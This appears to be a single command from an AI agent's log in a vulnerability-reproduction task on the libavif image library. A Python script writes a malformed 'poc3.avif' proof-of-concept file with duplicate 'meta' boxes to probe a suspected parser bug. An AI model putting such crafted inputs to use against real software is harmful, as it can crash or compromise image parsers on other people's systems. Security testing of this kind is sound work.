message:
Running command: cd /workspace/repo-vul/src-vul/libavif && python3 - <<'PY'
import struct, pathlib
p=pathlib.Path('/workspace/poc3.avif')
# ftyp compatible with avif
ftyp = b'avif' + struct.pack('>I',0) + b'avif'
# meta full box version/flags + iinf box with duplicate infe entries? maybe parser bug on uniqueness not handled across top-level meta boxes.
meta = b'\x00\x00\x00\x00'
# two meta boxes and one moov box to stress top-level uniqueness
moov = b''
boxes=[struct.pack('>I4s',8+len(ftyp),b'ftyp')+ftyp,
       struct.pack('>I4s',8+len(meta),b'meta')+meta,
       struct.pack('>I4s',8+len(meta),b'meta')+meta,
       struct.pack('>I4s',8+len(moov),b'moov')+moov]
p.write_bytes(b''.join(boxes))
print(p.stat().st_size)
PY
